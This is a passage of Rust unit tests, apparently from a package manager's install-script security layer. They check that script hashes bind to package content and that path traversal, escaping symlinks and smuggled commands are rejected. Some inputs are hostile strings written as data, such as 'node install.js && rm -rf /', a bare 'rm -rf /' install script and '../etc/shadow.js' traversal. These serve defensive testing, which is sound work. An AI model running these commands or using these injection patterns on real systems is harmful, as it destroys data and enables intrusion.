        write_pkg_json(
            dir.path(),
            &serde_json::json!({"install": "node-gyp rebuild"}),
        );
        let h = compute_script_hash(dir.path()).unwrap();
        let dir2 = tempdir().unwrap();
        write_pkg_json(
            dir2.path(),
            &serde_json::json!({"install": "node-gyp rebuild"}),
        );
        fs::write(
            dir2.path().join("install.js"),
            b"// completely unrelated content\n",
        )
        .unwrap();
        let h2 = compute_script_hash(dir2.path()).unwrap();
        assert_ne!(h, h2);
    }

    #[test]
    fn compute_script_hash_ignores_dependency_links_and_generated_markers() {
        let dir = tempdir().unwrap();
        write_pkg_json(
            dir.path(),
            &serde_json::json!({"install": "node-gyp rebuild"}),
        );
        fs::write(dir.path().join("binding.gyp"), "{}\n").unwrap();
        let initial = compute_script_hash(dir.path()).unwrap();

        fs::create_dir_all(dir.path().join("node_modules/dep")).unwrap();
        fs::write(
            dir.path().join("node_modules/dep/package.json"),
            r#"{"name":"dep","version":"2.0.0"}"#,
        )
        .unwrap();
        for marker in [
            ".integrity",
            ".lpm-security.json",
            ".lpm-object-integrity",
            ".lpm-tree-snapshot.json",
            ".lpm-built",
            ".lpm-build-complete",
        ] {
            fs::write(dir.path().join(marker), "generated\n").unwrap();
        }

        assert_eq!(initial, compute_script_hash(dir.path()).unwrap());
    }

    #[test]
    fn compute_script_hash_returns_none_when_delegated_file_is_missing() {
        let dir = tempdir().unwrap();
        write_pkg_json(
            dir.path(),
            &serde_json::json!({"postinstall": "node install.js"}),
        );

        assert!(compute_script_hash(dir.path()).is_none());
    }

    #[test]
    fn compute_script_hash_resolves_extensionless_local_dependencies() {
        let dir = tempdir().unwrap();
        write_pkg_json(
            dir.path(),
            &serde_json::json!({"postinstall": "node install.js"}),
        );
        fs::write(dir.path().join("install.js"), "require('./payload')\n").unwrap();
        fs::write(dir.path().join("payload.js"), "module.exports = true\n").unwrap();

        assert!(compute_script_hash(dir.path()).is_some());
    }

    #[test]
    fn compute_script_hash_returns_none_when_transitive_delegate_escapes_package() {
        let dir = tempdir().unwrap();
        write_pkg_json(
            dir.path(),
            &serde_json::json!({"postinstall": "node install.js"}),
        );
        fs::write(dir.path().join("install.js"), "require('../outside.js')\n").unwrap();

        assert!(compute_script_hash(dir.path()).is_none());
    }

    #[test]
    fn compute_script_hash_returns_none_when_delegate_graph_exceeds_depth_limit() {
        let dir = tempdir().unwrap();
        write_pkg_json(
            dir.path(),
            &serde_json::json!({"postinstall": "node depth-0.js"}),
        );
        for depth in 0..=MAX_DELEGATE_GRAPH_DEPTH {
            fs::write(
                dir.path().join(format!("depth-{depth}.js")),
                format!("require('./depth-{}.js')\n", depth + 1),
            )
            .unwrap();
        }
        fs::write(
            dir.path()
                .join(format!("depth-{}.js", MAX_DELEGATE_GRAPH_DEPTH + 1)),
            "module.exports = 'unseen payload'\n",
        )
        .unwrap();

        assert!(compute_script_hash(dir.path()).is_none());
    }

    #[test]
    fn compute_script_hash_returns_none_when_delegate_graph_exceeds_file_limit() {
        let dir = tempdir().unwrap();
        write_pkg_json(
            dir.path(),
            &serde_json::json!({"postinstall": "node entry.js"}),
        );
        let mut entry = String::with_capacity(MAX_DELEGATE_GRAPH_FILES * 24);
        for index in 0..MAX_DELEGATE_GRAPH_FILES {
            entry.push_str(&format!("require('./leaf-{index}.js')\n"));
            fs::write(
                dir.path().join(format!("leaf-{index}.js")),
                "module.exports = true\n",
            )
            .unwrap();
        }
        fs::write(dir.path().join("entry.js"), entry).unwrap();

        assert!(compute_script_hash(dir.path()).is_none());
    }

    #[cfg(unix)]
    #[test]
    fn compute_script_hash_returns_none_when_delegate_resolves_outside_package() {
        use std::os::unix::fs::symlink;

        let dir = tempdir().unwrap();
        let external = tempdir().unwrap();
        write_pkg_json(
            dir.path(),
            &serde_json::json!({"postinstall": "node install.js"}),
        );
        let external_script = external.path().join("payload.js");
        fs::write(&external_script, "module.exports = 'outside'\n").unwrap();
        symlink(external_script, dir.path().join("install.js")).unwrap();

        assert!(compute_script_hash(dir.path()).is_none());
    }

    /// The shared recognizer in
    /// [`crate::static_gate::extract_delegate_path`] must reject
    /// `node ../etc/shadow.js` and similar escape attempts so a
    /// malicious package can't drive disk reads outside the package
    /// directory via the delegate-binding code path.
    #[test]
    fn delegate_recognizer_rejects_path_traversal_and_shell_metas() {
        use crate::static_gate::extract_delegate_path;
        assert_eq!(
            extract_delegate_path("node install.js"),
            Some("install.js".to_string())
        );
        assert_eq!(
            extract_delegate_path("node ./install.js"),
            Some("./install.js".to_string())
        );
        assert_eq!(extract_delegate_path("node ../install.js"), None);
        assert_eq!(extract_delegate_path("node /etc/install.js"), None);
        assert_eq!(extract_delegate_path("node ~/install.js"), None);
        // shlex strips quoting, so `node "install.js"` and the bare
        // form are equivalent — both recognised.
        assert_eq!(
            extract_delegate_path("node \"install.js\""),
            Some("install.js".to_string())
        );
        assert_eq!(extract_delegate_path("node install.js && rm -rf /"), None);
        assert_eq!(extract_delegate_path("node install.sh"), None);
        assert_eq!(extract_delegate_path("node install"), None);
        // Non-reserved basenames ARE delegate shapes too — the static
        // gate's matches_node_relative greenlights them unconditionally,
        // so the hash must bind them to prevent the same upgrade attack.
        assert_eq!(
            extract_delegate_path("node my-build.js"),
            Some("my-build.js".to_string())
        );
        // Reserved basenames in nested paths are accepted (the static
        // gate also accepts these via the safe-relative check).
        assert_eq!(
            extract_delegate_path("node scripts/install.js"),
            Some("scripts/install.js".to_string())
        );

        // Softfail wrapper recognition — both supported shapes.
        assert_eq!(
            extract_delegate_path("node -e \"try{require('./scripts/setup.js')}catch(e){}\""),
            Some("./scripts/setup.js".to_string())
        );
        assert_eq!(
            extract_delegate_path("node -e \"import('./init.mjs').catch(() => void 0)\""),
            Some("./init.mjs".to_string())
        );
        assert_eq!(
            extract_delegate_path("node --eval \"try{require('./bootstrap.cjs')}catch(e){}\""),
            Some("./bootstrap.cjs".to_string())
        );

        // Softfail wrapper with a non-empty catch body — rejected by
        // the static gate's parse_softfail_wrapper, must also be
        // rejected here (the catch body could itself execute code).
        assert_eq!(
            extract_delegate_path(
                "node -e \"try{require('./scripts/setup.js')}catch(e){doEvil()}\""
            ),
            None
        );

        // Softfail wrapper whose inner path escapes the package root
        // is rejected even though the wrapper shape itself matches.
        assert_eq!(
            extract_delegate_path("node -e \"try{require('../../../etc/passwd.js')}catch(e){}\""),
            None
        );

        // Softfail wrapper whose inner path lacks a `.js`/`.cjs`/`.mjs`
        // extension is rejected — extensionless require resolution is
        // ambiguous (could resolve to `.js`, `.json`, `index.js`, etc.)
        // so the hash cannot deterministically pick a file to bind.
        assert_eq!(
            extract_delegate_path("node -e \"try{require('./scripts/setup')}catch(e){}\""),
            None
        );
    }

    #[test]
    fn compute_script_hash_distinguishes_payload_moved_between_phases() {
        // CRITICAL: an attacker who moves a payload from `install` to
        // `postinstall` (or vice versa) MUST produce a different hash.
        // The FIELD_SEP byte after each phase name is what guarantees this:
        // the byte stream is "preinstall\x00...\x1einstall\x00...\x1epostinstall\x00..."
        // so the same body in different phases hashes differently.
        let dir1 = tempdir().unwrap();
        let dir2 = tempdir().unwrap();
        write_pkg_json(dir1.path(), &serde_json::json!({"install": "rm -rf /"}));
        write_pkg_json(dir2.path(), &serde_json::json!({"postinstall": "rm -rf /"}));
        assert_ne!(
            compute_script_hash(dir1.path()).unwrap(),
            compute_script_hash(dir2.path()).unwrap(),
            "moving a payload between phases must change the hash"
        );
    }

    #[test]
    fn compute_script_hash_changes_when_dynamic_local_payload_changes() {
        let dir1 = tempdir().unwrap();
        let dir2 = tempdir().unwrap();
        let scripts = serde_json::json!({"postinstall": "node install.js"});
        write_pkg_json(dir1.path(), &scripts);
        write_pkg_json(dir2.path(), &scripts);
        let entry = "require('./payload-' + process.platform + '.js')\n";
        fs::write(dir1.path().join("install.js"), entry).unwrap();
        fs::write(dir2.path().join("install.js"), entry).unwrap();
        fs::write(dir1.path().join("payload-darwin.js"), "benign\n").unwrap();
        fs::write(dir2.path().join("payload-darwin.js"), "malicious\n").unwrap();

        assert_ne!(
            compute_script_hash(dir1.path()),
            compute_script_hash(dir2.path()),
            "dynamic local loads must remain bound to the package content"
        );
    }

    #[test]
    fn compute_script_hash_changes_when_node_command_with_args_payload_changes() {
        let dir1 = tempdir().unwrap();
        let dir2 = tempdir().unwrap();
        let scripts = serde_json::json!({"postinstall": "node install.js --verbose"});
        write_pkg_json(dir1.path(), &scripts);
        write_pkg_json(dir2.path(), &scripts);
        fs::write(dir1.path().join("install.js"), "benign\n").unwrap();
        fs::write(dir2.path().join("install.js"), "malicious\n").unwrap();

        assert_ne!(
            compute_script_hash(dir1.path()),
            compute_script_hash(dir2.path())
        );
    }

    #[test]
    fn compute_script_hash_binds_exact_extensionless_node_target() {
        let dir1 = tempdir().unwrap();
        let dir2 = tempdir().unwrap();
        let scripts = serde_json::json!({"postinstall": "node install.js"});
        write_pkg_json(dir1.path(), &scripts);
        write_pkg_json(dir2.path(), &scripts);
        fs::write(dir1.path().join("install.js"), "require('./payload')\n").unwrap();
        fs::write(dir2.path().join("install.js"), "require('./payload')\n").unwrap();
        fs::write(dir1.path().join("payload.js"), "decoy\n").unwrap();
        fs::write(dir2.path().join("payload.js"), "decoy\n").unwrap();
        fs::write(dir1.path().join("payload"), "benign\n").unwrap();
        fs::write(dir2.path().join("payload"), "malicious\n").unwrap();

        assert_ne!(
            compute_script_hash(dir1.path()),
            compute_script_hash(dir2.path())
        );
    }

    #[cfg(unix)]
    #[test]
    fn compute_script_hash_returns_none_when_package_symlink_escapes_package() {
        use std::os::unix::fs::symlink;

        let dir = tempdir().unwrap();
        let outside = tempdir().unwrap();
        write_pkg_json(
            dir.path(),
            &serde_json::json!({"postinstall": "node install.js"}),
        );
        fs::write(
            dir.path().join("install.js"),
            "require('./' + 'payload.js')\n",
        )
        .unwrap();
        fs::write(outside.path().join("payload.js"), "mutable\n").unwrap();
        symlink(
            outside.path().join("payload.js"),
            dir.path().join("payload.js"),
        )
        .unwrap();

        assert!(compute_script_hash(dir.path()).is_none());
    }

    #[cfg(unix)]
    #[test]
    fn compute_script_hash_binds_internal_symlink_target_content() {
        use std::os::unix::fs::symlink;

        let dir = tempdir().unwrap();
        write_pkg_json(
            dir.path(),
            &serde_json::json!({"postinstall": "node install.js"}),
        );
        fs::write(
            dir.path().join("install.js"),
            "require('./' + 'payload.js')\n",
        )
        .unwrap();
        let target = dir.path().join("payload-real.js");
        fs::write(&target, "benign\n").unwrap();
        symlink("payload-real.js", dir.path().join("payload.js")).unwrap();
        let before = compute_script_hash(dir.path()).unwrap();

        fs::write(target, "changed\n").unwrap();

        assert_ne!(before, compute_script_hash(dir.path()).unwrap());
    }

    #[test]
    fn compute_script_hash_empty_string_phase_treated_as_absent() {
        // `{"install": ""}` should be the same as `{"install" missing}` —
        // both are "no install script". The any_present pre-scan returns
        // None for both.
        let dir1 = tempdir().unwrap();
        let dir2 = tempdir().unwrap();
        write_pkg_json(dir1.path(), &serde_json::json!({"install": ""}));
        write_pkg_json(dir2.path(), &serde_json::json!({}));
        assert!(compute_script_hash(dir1.path()).is_none());
        assert!(compute_script_hash(dir2.path()).is_none());
    }

    #[test]
    fn compute_script_hash_distinguishes_present_empty_from_absent_when_other_phases_have_content()
    {
        // The executed phase-body prefix treats both forms as empty, but the
        // canonical manifest suffix binds the complete package content.
        let dir1 = tempdir().unwrap();
        let dir2 = tempdir().unwrap();
        write_pkg_json(
            dir1.path(),
            &serde_json::json!({"preinstall": "x", "install": ""}),
        );
        write_pkg_json(dir2.path(), &serde_json::json!({"preinstall": "x"}));
        assert_ne!(
            compute_script_hash(dir1.path()),
            compute_script_hash(dir2.path()),
            "present-empty and absent manifest fields are distinct content"
        );
    }

    #[test]
    fn executed_install_phases_const_is_subset_of_blocked_scripts() {
        // Coherence regression: if anyone widens BLOCKED_SCRIPTS or
        // narrows EXECUTED_INSTALL_PHASES, the subset relationship is
        // the contract. The hash phases must always be a subset of the
        // blocked phases (you can't run something that isn't blocked).
        for phase in EXECUTED_INSTALL_PHASES {
            assert!(
                crate::SecurityPolicy::is_blocked_script(phase),
                "EXECUTED_INSTALL_PHASES contains {phase:?} but it is not in BLOCKED_SCRIPTS"
            );
        }
    }

    #[test]
    fn hex_lower_zero_byte() {
        assert_eq!(hex_lower(&[0x00]), "00");
    }

    #[test]
    fn hex_lower_max_byte() {
        assert_eq!(hex_lower(&[0xff]), "ff");
    }

    #[test]
    fn hex_lower_multibyte() {
        assert_eq!(hex_lower(&[0xab, 0xcd, 0xef, 0x12, 0x34]), "abcdef1234");
    }
}
